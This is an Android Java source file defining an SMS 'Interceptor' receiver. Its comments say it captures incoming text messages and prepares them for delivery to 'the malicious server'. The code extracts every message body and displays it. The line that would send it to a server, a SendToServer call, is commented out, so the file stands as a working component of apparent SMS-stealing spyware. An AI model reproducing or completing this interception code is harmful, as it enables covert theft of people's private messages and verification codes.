package com.example.aahewins.helloworld;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.widget.Toast;
/**
 * Waits for an SMS message to be sent and prepares to send the SMS contents to the server
 * @author Anthony Hewins
 * @version 1.1
 * @since 1.0
 */
public class Interceptor extends BroadcastReceiver {
    /**
     * Receives the broadcast of a SMS message being received and prepares it to be delivered to
     * the malicious server. It checks the intent bundle != null, then grabs the pdus and
     * builds the message off it.
     * @param context SMS broadcast
     * @param intent SMS intent
     */
    @Override
    @SuppressWarnings("deprecation")
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        SmsMessage[] messages = null;
        String message = null;
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            messages = new SmsMessage[pdus.length];
            for (int i=0; i < messages.length; i++) {
                messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]); //needed for old OS
                message = messages[i].getMessageBody().toString();
            }
            if (message != null) {
                Toast.makeText(context, "Extracted text message:\n" + message, Toast.LENGTH_LONG).show();
//                new SendToServer(context, message);
            }
                else
                Toast.makeText(context, "Message is null;\nsomething went wrong", Toast.LENGTH_LONG).show();
        }
    }
}